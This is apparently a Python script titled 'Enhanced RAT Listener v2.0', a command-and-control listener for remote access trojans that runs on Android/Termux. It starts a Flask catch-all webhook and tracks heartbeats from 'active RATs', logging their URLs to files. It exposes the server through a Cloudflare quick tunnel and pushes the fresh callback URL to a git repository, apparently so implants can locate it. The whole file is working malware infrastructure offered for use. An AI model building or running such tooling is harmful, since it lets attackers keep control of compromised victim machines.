#!/usr/bin/env python3
import os
import re
import sys
import json
import time
import signal
import queue
import threading
import subprocess
import random
from typing import Optional, Dict
from datetime import datetime

from flask import Flask, request, jsonify

# Color utilities for cross-platform support
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    # Fallback if colorama is not available
    class MockColor:
        def __getattr__(self, name):
            return ""
    Fore = Back = Style = MockColor()
    COLORS_AVAILABLE = False

# Color scheme
class Colors:
    HEADER = Fore.CYAN + Style.BRIGHT
    SUCCESS = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    ERROR = Fore.RED + Style.BRIGHT
    INFO = Fore.BLUE + Style.BRIGHT
    PURPLE = Fore.MAGENTA + Style.BRIGHT
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
    DIM = Style.DIM

# Cool ASCII art and animations
def print_gradient_text(text, colors):
    """Print text with gradient colors"""
    if not COLORS_AVAILABLE:
        print(text)
        return
    
    lines = text.split('\n')
    for line in lines:
        if line.strip():
            colored_line = ""
            for i, char in enumerate(line):
                color_idx = i % len(colors)
                colored_line += colors[color_idx] + char
            print(colored_line + Colors.RESET)
        else:
            print()

def animate_loading(text, duration=2):
    """Animated loading effect"""
    frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for frame in frames:
            if time.time() >= end_time:
                break
            print(f"\r{Colors.INFO}{frame} {text}{Colors.RESET}", end="", flush=True)
            time.sleep(0.1)
    print(f"\r{Colors.SUCCESS}✓ {text}{Colors.RESET}")

def print_box(text, color=Colors.INFO):
    """Print text in a colored box"""
    lines = text.split('\n')
    max_length = max(len(line) for line in lines) if lines else 0
    
    print(color + "╔" + "═" * (max_length + 2) + "╗" + Colors.RESET)
    for line in lines:
        padding = max_length - len(line)
        print(color + "║ " + line + " " * padding + " ║" + Colors.RESET)
    print(color + "╚" + "═" * (max_length + 2) + "╝" + Colors.RESET)

def display_system_info():
    """Display cool system information"""
    import platform
    import psutil
    
    try:
        # Get system info
        system = platform.system()
        node = platform.node()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()
        
        # Get memory info
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        info_text = f"""
{Colors.HEADER}🖥️  SYSTEM INFORMATION{Colors.RESET}
{Colors.HEADER}{'─'*50}{Colors.RESET}
{Colors.INFO}💻 System:{Colors.RESET} {system} {release}
{Colors.INFO}🏷️  Node:{Colors.RESET} {node}
{Colors.INFO}⚙️  Machine:{Colors.RESET} {machine}
{Colors.INFO}🧠 Memory:{Colors.RESET} {memory.percent}% used ({memory.used // (1024**3)}GB / {memory.total // (1024**3)}GB)
{Colors.INFO}💾 Disk:{Colors.RESET} {disk.percent}% used ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)
{Colors.INFO}🐍 Python:{Colors.RESET} {platform.python_version()}
{Colors.HEADER}{'─'*50}{Colors.RESET}
        """
        print(info_text)
    except ImportError:
        # Fallback if psutil is not available
        info_text = f"""
{Colors.HEADER}🖥️  SYSTEM INFORMATION{Colors.RESET}
{Colors.HEADER}{'─'*50}{Colors.RESET}
{Colors.INFO}💻 System:{Colors.RESET} {platform.system()} {platform.release()}
{Colors.INFO}🏷️  Node:{Colors.RESET} {platform.node()}
{Colors.INFO}⚙️  Machine:{Colors.RESET} {platform.machine()}
{Colors.INFO}🐍 Python:{Colors.RESET} {platform.python_version()}
{Colors.HEADER}{'─'*50}{Colors.RESET}
        """
        print(info_text)
    except Exception as e:
        print(f"{Colors.WARNING}⚠️  Could not retrieve system info: {e}{Colors.RESET}")

def display_network_status():
    """Display network connectivity status"""
    try:
        import socket
        
        # Test internet connectivity
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        print(f"{Colors.SUCCESS}🌐 Internet connectivity: ONLINE{Colors.RESET}")
        
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        print(f"{Colors.INFO}📍 Local IP: {local_ip}{Colors.RESET}")
        
    except Exception:
        print(f"{Colors.ERROR}🌐 Internet connectivity: OFFLINE{Colors.RESET}")

def show_startup_tips():
    """Display helpful startup tips"""
    tips = [
        "💡 Make sure your device stays connected to the internet",
        "🔋 Consider keeping your device plugged in for long sessions",
        "📱 Use 'termux-wake-lock' to prevent Android from sleeping",
        "🔒 Always use secure connections and be aware of your network",
        "📊 Monitor the heartbeat status to track active connections"
    ]
    
    print(f"\n{Colors.HEADER}💡 STARTUP TIPS{Colors.RESET}")
    print(f"{Colors.HEADER}{'─'*50}{Colors.RESET}")
    for tip in tips:
        print(f"{Colors.DIM}  {tip}{Colors.RESET}")
    print(f"{Colors.HEADER}{'─'*50}{Colors.RESET}\n")

# -----------------------------
# Config for Termux
# -----------------------------
"""
pkg update && pkg upgrade
pkg install python flask cloudflared
pip install flask requests
"""
HOST = os.environ.get("LISTENER_HOST", "127.0.0.1")
PORT = int(os.environ.get("LISTENER_PORT", "8081"))
CLOUDFLARED_PATH = os.environ.get("CLOUDFLARED_PATH", "cloudflared")  # Termux uses PATH
LOG_BODY_MAX = int(os.environ.get("LOG_BODY_MAX", "65536"))  # 64KB safety cap
HEARTBEAT_TIMEOUT = 40  # seconds

# -----------------------------
# Heartbeat Tracker
# -----------------------------
class HeartbeatTracker:
    def __init__(self):
        self.active_rats: Dict[str, Dict] = {}
        self.lock = threading.Lock()
        self.running = True
        
    def update_heartbeat(self, url: str, status: str = "alive"):
        """Update heartbeat for a RAT URL"""
        with self.lock:
            self.active_rats[url] = {
                'last_seen': time.time(),
                'status': status,
                'first_seen': self.active_rats.get(url, {}).get('first_seen', time.time())
            }
            self.save_active_rats()
            
    def remove_dead_rats(self):
        """Remove RATs that haven't sent heartbeat in HEARTBEAT_TIMEOUT seconds"""
        current_time = time.time()
        dead_rats = []
        
        with self.lock:
            for url, info in list(self.active_rats.items()):
                if current_time - info['last_seen'] > HEARTBEAT_TIMEOUT:
                    dead_rats.append(url)
                    del self.active_rats[url]
            
            if dead_rats:
                self.save_active_rats()
                
        return dead_rats
    
    def get_active_rats(self):
        """Get list of currently active RATs"""
        with self.lock:
            return dict(self.active_rats)
    
    def save_active_rats(self):
        """Save active RATs to file"""
        try:
            urls = list(self.active_rats.keys())
            with open('active_rats.txt', 'w') as f:
                for url in urls:
                    f.write(f"{url}\n")
            
            # Also save detailed info
            with open('rats_status.json', 'w') as f:
                json.dump(self.active_rats, f, indent=2)
        except Exception as e:
            print(f"{Colors.ERROR}❌ Error saving RATs: {e}{Colors.RESET}")
    
    def monitor_heartbeats(self):
        """Background thread to monitor heartbeats"""
        while self.running:
            try:
                dead_rats = self.remove_dead_rats()
                if dead_rats:
                    print(f"\n{Colors.ERROR}💀 DEAD RATs removed:{Colors.RESET}")
                    for rat in dead_rats:
                        print(f"  {Colors.ERROR}❌ {rat}{Colors.RESET}")
                    print(f"{Colors.INFO}📝 Updated active_rats.txt{Colors.RESET}")
                
                # Show status every 30 seconds with cool formatting
                active = self.get_active_rats()
                if active:
                    current_time = datetime.now().strftime("%H:%M:%S")
                    print(f"\n{Colors.HEADER}{'='*80}{Colors.RESET}")
                    print(f"{Colors.SUCCESS}💓 HEARTBEAT STATUS - {current_time} ({len(active)} active RATs){Colors.RESET}")
                    print(f"{Colors.HEADER}{'='*80}{Colors.RESET}")
                    
                    for i, (url, info) in enumerate(active.items(), 1):
                        last_seen = time.time() - info['last_seen']
                        uptime = time.time() - info['first_seen']
                        
                        # Status indicators
                        status_color = Colors.SUCCESS if last_seen < 20 else Colors.WARNING if last_seen < 35 else Colors.ERROR
                        status_icon = "🟢" if last_seen < 20 else "🟡" if last_seen < 35 else "🔴"
                        
                        # Format uptime
                        uptime_str = f"{int(uptime//3600)}h {int((uptime%3600)//60)}m {int(uptime%60)}s"
                        
                        print(f"  {Colors.BOLD}[{i:02d}]{Colors.RESET} {status_icon} {status_color}{url}{Colors.RESET}")
                        print(f"       {Colors.DIM}├─ Last seen: {last_seen:.1f}s ago{Colors.RESET}")
                        print(f"       {Colors.DIM}├─ Status: {info['status'].upper()}{Colors.RESET}")
                        print(f"       {Colors.DIM}└─ Uptime: {uptime_str}{Colors.RESET}")
                        
                        if i < len(active):
                            print(f"       {Colors.DIM}│{Colors.RESET}")
                    
                    print(f"{Colors.HEADER}{'='*80}{Colors.RESET}")
                
                time.sleep(10)  # Check every 10 seconds
            except Exception as e:
                print(f"{Colors.ERROR}❌ Heartbeat monitor error: {e}{Colors.RESET}")
                time.sleep(10)

# Global heartbeat tracker
heartbeat_tracker = HeartbeatTracker()

# -----------------------------
# Flask App
# -----------------------------
app = Flask(__name__)

@app.route("/", methods=["GET"])  # Healthcheck / quick message
def index():
    return jsonify({
        "status": "ok",
        "message": "Termux HTTP listener is running",
        "platform": "termux"
    })

@app.route("/webhook", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])  # catch common verbs
@app.route("/<path:any_path>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])  # catch-all
def catch_all(any_path: Optional[str] = None):
    # Log request summary
    info = {
        "method": request.method,
        "path": request.path,
        "args": request.args.to_dict(flat=False),
        "headers": {k: v for k, v in request.headers.items()},
        "remote_addr": request.remote_addr,
    }

    # Body handling (cap size)
    body_bytes = request.get_data(cache=False, as_text=False)
    truncated = False
    if body_bytes and len(body_bytes) > LOG_BODY_MAX:
        body_bytes = body_bytes[:LOG_BODY_MAX]
        truncated = True

    content_type = request.headers.get("Content-Type", "")
    parsed_body = None
    
    # Try multiple ways to parse JSON
    if content_type.startswith("application/json") or body_bytes:
        try:
            # Method 1: Flask's get_json
            parsed_body = request.get_json(silent=True)
        except Exception:
            pass
            
        # Method 2: Manual JSON parsing if Flask method failed
        if parsed_body is None and body_bytes:
            try:
                json_str = body_bytes.decode('utf-8')
                parsed_body = json.loads(json_str)
            except Exception:
                pass

    # Only process if we have parsed JSON body
    if parsed_body is not None:
        # Extract URL from the text field if it exists
        if isinstance(parsed_body, dict) and 'text' in parsed_body:
            text = parsed_body['text']
            # Extract URL using regex
            import re
            url_pattern = r'https?://[^\s]+'
            urls = re.findall(url_pattern, text)
            if urls:
                extracted_url = urls[0]
                
                # Determine status from text
                status = "waiting" if "waiting" in text.lower() else "connected" if "connected" in text.lower() else "alive"
                
                # Update heartbeat tracker
                heartbeat_tracker.update_heartbeat(extracted_url, status)
                
                active_count = len(heartbeat_tracker.get_active_rats())
                status_color = Colors.SUCCESS if status == "connected" else Colors.WARNING if status == "waiting" else Colors.INFO
                print(f"{Colors.HEADER}🔗 {status_color}{extracted_url}{Colors.RESET} - Status: {status_color}{status.upper()}{Colors.RESET} ({Colors.BOLD}{active_count} active{Colors.RESET})")
    
    # Handle non-JSON requests silently (just process them without logging)

    # Echo back a simple response
    resp_payload = {
        "received": True,
        "method": info["method"],
        "path": info["path"],
        "platform": "termux",
        "timestamp": time.time()
    }
    if parsed_body is not None:
        resp_payload["body"] = parsed_body
    
    return jsonify(resp_payload)

# -----------------------------
# Cloudflared management for Termux
# -----------------------------
CF_URL_REGEX = re.compile(r"https?://[\w.-]+\.trycloudflare\.com/?", re.IGNORECASE)

def run_flask(stop_event: threading.Event):
    # Run Flask in this thread; stop_event is only used for coordinated shutdown
    from werkzeug.serving import make_server
    server = make_server(HOST, PORT, app)
    server.timeout = 1

    def serve_forever():
        while not stop_event.is_set():
            server.handle_request()
    t = threading.Thread(target=serve_forever, daemon=True)
    t.start()
    return server, t


def spawn_cloudflared_termux(url: str, output_queue: queue.Queue) -> subprocess.Popen:
    # Termux-specific cloudflared command
    args = [
        CLOUDFLARED_PATH,
        "tunnel",
        "--url",
        url,
        "--no-autoupdate",
        "--loglevel",
        "info",
    ]

    try:
        # Termux doesn't need CREATE_NO_WINDOW flag
        proc = subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=1,
            universal_newlines=True,
        )
    except FileNotFoundError:
        error_msg = """
        ╔══════════════════════════════════════════════════════════════╗
        ║                    ❌ CLOUDFLARED NOT FOUND                   ║
        ║                                                              ║
        ║  Please install cloudflared to continue:                    ║
        ║                                                              ║
        ║  📦 For Termux:                                              ║
        ║     pkg install cloudflared                                  ║
        ║                                                              ║
        ║  🌐 Manual download:                                         ║
        ║     https://github.com/cloudflare/cloudflared/releases       ║
        ╚══════════════════════════════════════════════════════════════╝
        """
        print(f"{Colors.ERROR}{error_msg}{Colors.RESET}")
        sys.exit(1)

    def reader():
        assert proc.stdout is not None
        for line in proc.stdout:
            output_queue.put(line)
        output_queue.put(None)  # signal EOF

    threading.Thread(target=reader, daemon=True).start()
    return proc


def extract_public_url_from_line(line: str) -> Optional[str]:
    m = CF_URL_REGEX.search(line)
    if m:
        return m.group(0).rstrip('/')
    return None


def display_cool_banner():
    """Display an awesome animated banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    banner = """
    ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗    ██████╗  █████╗ ████████╗
    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝    ██╔══██╗██╔══██╗╚══██╔══╝
       ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝     ██████╔╝███████║   ██║   
       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗     ██╔══██╗██╔══██║   ██║   
       ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗    ██║  ██║██║  ██║   ██║   
       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    
    ██╗     ██╗███████╗████████╗███████╗███╗   ██╗███████╗██████╗     ██╗   ██╗██████╗ 
    ██║     ██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔══██╗    ██║   ██║╚════██╗
    ██║     ██║███████╗   ██║   █████╗  ██╔██╗ ██║█████╗  ██████╔╝    ██║   ██║ █████╔╝
    ██║     ██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
    ███████╗██║███████║   ██║   ███████╗██║ ╚████║███████╗██║  ██║     ╚████╔╝ ███████╗
    ╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝
    """
    
    # Gradient colors for the banner
    gradient_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    print_gradient_text(banner, gradient_colors)
    
    # Cool subtitle with effects
    subtitle = f"""
    {Colors.HEADER}╔══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
    {Colors.HEADER}║{Colors.RESET}                    {Colors.PURPLE}🚀 ENHANCED RAT LISTENER v2.0 🚀{Colors.RESET}                      {Colors.HEADER}║{Colors.RESET}
    {Colors.HEADER}║{Colors.RESET}                  {Colors.SUCCESS}📱 Optimized for Android/Termux 📱{Colors.RESET}                   {Colors.HEADER}║{Colors.RESET}
    {Colors.HEADER}║{Colors.RESET}                        {Colors.WARNING}⚡ Created by Mr.Z ⚡{Colors.RESET}                         {Colors.HEADER}║{Colors.RESET}
    {Colors.HEADER}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """
    print(subtitle)
    
    # Animated loading effect
    animate_loading("Initializing Termux RAT Listener", 1.5)
    print()

def main():
    display_cool_banner()
    
    # Display system information
    display_system_info()
    display_network_status()
    show_startup_tips()
    
    stop_event = threading.Event()

    # Handle Ctrl+C gracefully
    def handle_sigint(signum, frame):
        stop_event.set()
        heartbeat_tracker.running = False
    signal.signal(signal.SIGINT, handle_sigint)
    if hasattr(signal, 'SIGTERM'):
        signal.signal(signal.SIGTERM, handle_sigint)

    # 1) Start heartbeat monitor
    print(f"{Colors.INFO}🔧 Starting system components...{Colors.RESET}")
    heartbeat_thread = threading.Thread(target=heartbeat_tracker.monitor_heartbeats, daemon=True)
    heartbeat_thread.start()
    print(f"{Colors.SUCCESS}✓ Heartbeat monitor started{Colors.RESET} {Colors.DIM}(40s timeout){Colors.RESET}")

    # 2) Start Flask server
    server, server_thread = run_flask(stop_event)
    local_url = f"http://{HOST}:{PORT}"
    print(f"{Colors.SUCCESS}✓ Local server running at{Colors.RESET} {Colors.BOLD}{local_url}{Colors.RESET}")

    # 3) Start cloudflared and capture URL
    print(f"{Colors.INFO}🌐 Establishing Cloudflare tunnel...{Colors.RESET}")
    q: queue.Queue = queue.Queue()
    proc = spawn_cloudflared_termux(local_url, q)

    public_url: Optional[str] = None
    start_time = time.time()
    while True:
        try:
            line = q.get(timeout=1.0)
        except queue.Empty:
            line = ""
        if line is None:
            break
        if line:
            # Print cloudflared logs for transparency
            #print(f"[cloudflared] {line}", end="")
            if public_url is None:
                url_candidate = extract_public_url_from_line(line)
                if url_candidate:
                    public_url = url_candidate
                    os.system(f'echo "{public_url+"webhook"}" > url.txt')
                    subprocess.run(["git", "add", "-A"], check=True)
                    subprocess.run(["git", "commit", "-m", "ayam"], check=True)
                    subprocess.run(["git", "push", "origin", "main"], check=True)
                    
                    # Cool URL display
                    print(f"\n{Colors.SUCCESS}{'='*80}{Colors.RESET}")
                    print(f"{Colors.SUCCESS}🎉 TUNNEL ESTABLISHED SUCCESSFULLY! 🎉{Colors.RESET}")
                    print(f"{Colors.SUCCESS}{'='*80}{Colors.RESET}")
                    print_box(f"🌐 Public URL: {public_url}", Colors.HEADER)
                    print(f"\n{Colors.INFO}📡 Ready to receive connections!{Colors.RESET}")
                    print(f"{Colors.DIM}   Send POST requests to this URL for webhook communication{Colors.RESET}")
                    
        if public_url is None and (time.time() - start_time) > 20:
            print(f"{Colors.WARNING}⏳ Still waiting for cloudflared to provide a public URL...{Colors.RESET}")
            animate_loading("Establishing tunnel connection", 1)
            start_time = time.time()

        # Exit loop condition when stop requested
        if stop_event.is_set():
            break

    # 4) Wait until interrupted
    try:
        print(f"\n{Colors.SUCCESS}🔄 Listener active - Press Ctrl+C to stop{Colors.RESET}")
        print(f"{Colors.HEADER}{'─'*60}{Colors.RESET}")
        while not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass

    print(f"\n{Colors.WARNING}🛑 Shutdown initiated...{Colors.RESET}")
    animate_loading("Stopping services", 1)

    # Stop cloudflared
    if proc and proc.poll() is None:
        try:
            # Use terminate for cross-platform simplicity
            proc.terminate()
            try:
                proc.wait(timeout=5)
                print(f"{Colors.SUCCESS}✓ Cloudflare tunnel stopped{Colors.RESET}")
            except subprocess.TimeoutExpired:
                proc.kill()
                print(f"{Colors.WARNING}⚠ Cloudflare tunnel force-killed{Colors.RESET}")
        except Exception:
            pass

    # Stop Flask server
    stop_event.set()
    print(f"{Colors.SUCCESS}✓ Flask server stopped{Colors.RESET}")
    
    # Final goodbye message
    goodbye_msg = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                    👋 TERMUX LISTENER STOPPED                ║
    ║                                                              ║
    ║              Thanks for using Enhanced RAT v2.0!            ║
    ║                        Stay safe! 🛡️                         ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(f"{Colors.HEADER}{goodbye_msg}{Colors.RESET}")

if __name__ == "__main__":
    main()
